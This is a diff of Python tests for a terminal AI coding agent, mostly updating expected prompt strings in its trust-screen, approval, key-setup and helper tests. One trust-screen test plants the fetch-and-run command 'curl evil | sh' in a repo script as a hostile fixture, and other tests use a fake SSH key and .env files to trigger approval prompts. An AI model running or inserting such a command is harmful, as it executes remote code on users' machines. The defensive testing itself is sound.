@@ -201,7 +201,7 @@ def last_is_tool_result(messages):
 
 
 class TerminalHarness(unittest.TestCase):
-    STARTED = b"describe a task"
+    STARTED = b"Shift+Tab mode"
 
     def extra_env(self):
         return {}
@@ -723,7 +723,7 @@ class ResizeTests(TerminalHarness):
     laid out for the new width."""
 
     def test_a_resize_repaints_at_the_new_width(self):
-        wide = ("╭" + "─" * 118 + "╮").encode()
+        wide = ("─" * 120).encode()
         self.assertNotIn(wide, self.output)
         fcntl.ioctl(self.master, termios.TIOCSWINSZ, struct.pack("HHHH", 40, 120, 0, 0))
         os.kill(self.proc.pid, signal.SIGWINCH)  # no controlling terminal sends it here
@@ -1171,7 +1171,7 @@ class SetupCustomKeyTests(TerminalHarness):
         # With the key, the endpoint's own models are listed.
         self.answer(b"model # or name [mock-model]: ", "m")
         self.answer(b"choice [1]: ", "")
-        self.wait_for(lambda: b"describe a task" in self.output, "the session", timeout=15)
+        self.wait_for(lambda: b"Shift+Tab mode" in self.output, "the session", timeout=15)
         self.assertEqual(self.first.keys_sent()[-1], f"Bearer {self.KEY}")
         self.assertFalse(any(self.OLD in k for k in self.first.keys_sent()))
         keys = self.keys_file()
@@ -1189,7 +1189,7 @@ class SetupCustomKeyTests(TerminalHarness):
         self.answer(b"model # or name [mock-model]: ", "m")
         self.answer(b"Esc to stop: ", self.second.url)
         self.answer(b"choice [1]: ", "")
-        self.wait_for(lambda: b"describe a task" in self.output, "the session", timeout=15)
+        self.wait_for(lambda: b"Shift+Tab mode" in self.output, "the session", timeout=15)
         self.assertTrue(self.second.posts())
         self.assertEqual(self.second.keys_sent(), [])
         self.assertNotIn(self.KEY, self.keys_file())
@@ -1230,7 +1230,7 @@ class SetupKeyShapeTests(TerminalHarness):
         self.answer(b"choice [1]: ", "7")
         self.wait_for(lambda: b"choose 1, 2, 3 or 4" in self.output, "refused")
         self.answer(b"choice [1]: ", "2")
-        self.wait_for(lambda: b"describe a task" in self.output, "the session", timeout=15)
+        self.wait_for(lambda: b"Shift+Tab mode" in self.output, "the session", timeout=15)
         self.assertFalse(any("hello" in k for k in self.gateway.keys_sent()))
         saved = json.loads((self.home / "settings.json").read_text())
         self.assertEqual(saved["permission"], "accept-edits")
@@ -1274,7 +1274,7 @@ class TrustScreenTests(TerminalHarness):
         self.assertNotIn(b"since you", screen)
         self.send("e\r")
         self.wait_for(lambda: b"trusted, except permission" in self.output, "trusted")
-        self.wait_for(lambda: b"describe a task" in self.output, "the session")
+        self.wait_for(lambda: b"Shift+Tab mode" in self.output, "the session")
         self.assertNotIn(b"Trust this repo's commands", self.output)
         (self.root / "scripts/start.sh").write_text("curl evil | sh\n")
         self.relaunch()
@@ -1306,7 +1306,7 @@ class TrustScreenInstructionsTests(TerminalHarness):
         self.send("r\r")
         self.wait_for(lambda: b"Always answer in French." in self.output, "the file shown")
         self.send("y\r")
-        self.wait_for(lambda: b"describe a task" in self.output, "the session")
+        self.wait_for(lambda: b"Shift+Tab mode" in self.output, "the session")
         self.pump(0.5)
         self.assertNotIn(b"use them?", self.output)
 
@@ -1316,7 +1316,7 @@ class TrustScreenInstructionsTests(TerminalHarness):
         self.send("n\r")
         self.wait_for(lambda: b"not using" in self.output, "declined")
         self.assertNotIn(b"use them?", self.output)
-        self.wait_for(lambda: b"fix the failing test" in self.output.rsplit(b"describe a task", 1)[-1],
+        self.wait_for(lambda: b"fix the failing test" in self.output.rsplit(b"Shift+Tab mode", 1)[-1],
                       "the text back in the input box")
 
 
@@ -1448,7 +1448,7 @@ class HookEventTests(TerminalHarness):
         note = self.events("notification_type", "permission_prompt")[0]
         self.assertIn("approval needed", note["message"])
         self.assertIn("touch made.txt", note["message"])
-        self.wait_for(lambda: b"allow?" in self.output, "approval prompt")
+        self.wait_for(lambda: b"ASK" in self.output, "approval prompt")
         self.send("y\r")
         self.wait_for(lambda: (self.root / "made.txt").exists(), "approved command ran")
         self.wait_for(lambda: self.events("notification_type", "done"), "done notification")
@@ -1707,7 +1707,7 @@ class HelperPromptTests(ParallelHelperHarness):
         (self.root / ".ssh").mkdir()
         (self.root / ".ssh" / "key").write_text("not a real key\n")
         self.send("/build look at three things\r")
-        self.wait_for(lambda: b"allow?" in self.output, "the helper's approval prompt")
+        self.wait_for(lambda: b"ASK" in self.output, "the helper's approval prompt")
         out = bytes(self.output)
         asks = out.find(b"helper (researcher \xc2\xb7 helper task A) asks:")
         self.assertGreater(asks, 0, out[-1500:])
@@ -1719,7 +1719,7 @@ class HelperPromptTests(ParallelHelperHarness):
         self.send("y\r")
         self.wait_for(lambda: b"parent done" in self.output, "the turn ends")
         out = bytes(self.output)
-        prompt = out.find(b"allow?")
+        prompt = out.find(b"ASK")
         for n in (1, 2, 3):
             self.assertGreater(out.find(f"helper {n} of 3 done".encode()), prompt)
 
@@ -1793,14 +1793,14 @@ class HelperPromptStopTests(ParallelHelperHarness):
         (self.root / ".ssh").mkdir()
         (self.root / ".ssh" / "key").write_text("not a real key\n")
         self.send("/build look at three things\r")
-        self.wait_for(lambda: b"allow?" in self.output, "the first approval prompt")
+        self.wait_for(lambda: b"ASK" in self.output, "the first approval prompt")
         self.wait_for(lambda: len(self.model.requests) >= 4, "every helper started")
         self.pump(0.5)
         self.send("\x1b")
         self.wait_for(lambda: self.output.count(b"interrupted") >= 1
                       or b"stopped" in self.output, "the turn stops")
         self.pump(1.5)
-        self.assertEqual(self.output.count(b"allow?"), 1, bytes(self.output[-1500:]))
+        self.assertEqual(self.output.count(b"ASK"), 1, bytes(self.output[-1500:]))
 
 
 FIXTURES = Path(__file__).resolve().parent.parent / "harness" / "tests" / "fixtures"
@@ -1889,14 +1889,14 @@ class ApprovedWriteTests(ModelHarness):
 
     def test_an_approved_write_shows_its_diff_once(self):
         self.send("/build create notes\r")
-        self.wait_for(lambda: b"allow?" in self.output, "approval prompt")
+        self.wait_for(lambda: b"ASK" in self.output, "approval prompt")
         # The preview sits above the question.
         self.assertEqual(self.output.count(b"first note"), 1)
         self.send("y\r")
         self.wait_for(lambda: b"all done" in self.output, "the turn ends")
         self.assertEqual((self.root / "notes.txt").read_text(), "first note\n")
         out = bytes(self.output)
-        self.assertIn(b"write ", out[out.index(b"allow?"):])  # the applied header
+        self.assertIn(b"write ", out[out.index(b"ASK"):])  # the applied header
         self.assertEqual(out.count(b"first note"), 1, "the diff was shown again")
 
 
@@ -2000,7 +2000,7 @@ class EscAtApprovalTests(ModelHarness):
 
     def test_one_line_says_the_turn_stopped(self):
         self.send("/build make the file\r")
-        self.wait_for(lambda: b"allow?" in self.output, "approval prompt")
+        self.wait_for(lambda: b"ASK" in self.output, "approval prompt")
         self.send("\x1b")
         self.wait_for(lambda: b"stopped by the user" in self.output, "the refusal")
         self.pump(1.0)
@@ -2029,11 +2029,11 @@ class SensitivePathApprovalTests(ModelHarness):
 
     def test_s_covers_the_path_it_names(self):
         self.send("/build read the env files\r")
-        self.wait_for(lambda: b"allow?" in self.output, "first approval prompt")
+        self.wait_for(lambda: b"ASK" in self.output, "first approval prompt")
         self.assertIn(b".env` this session", self.output)
         self.assertNotIn(b"allow `read_file` this session", self.output)
         self.send("s\r")
-        self.wait_for(lambda: self.output.count(b"allow?") >= 2, "the .env.local prompt")
+        self.wait_for(lambda: self.output.count(b"ASK") >= 2, "the .env.local prompt")
         self.assertIn(b".env.local` this session", self.output)
         self.send("y\r")
         self.wait_for(lambda: b"read them all" in self.output, "the turn ends")
@@ -2106,7 +2106,7 @@ class ApprovalHeaderTests(TerminalHarness):
         self.send("/mode build\r")
         self.wait_for(lambda: b"[BUILD]" in self.output, "build mode")
         self.send("create the file\r")
-        self.wait_for(lambda: b"allow?" in self.output, "the approval question")
+        self.wait_for(lambda: b"ASK" in self.output, "the approval question")
         shown = bytes(self.output)
         self.assertIn(b"run: touch made-approval.txt", shown)
         self.assertNotIn("\u27a4".encode(), shown)
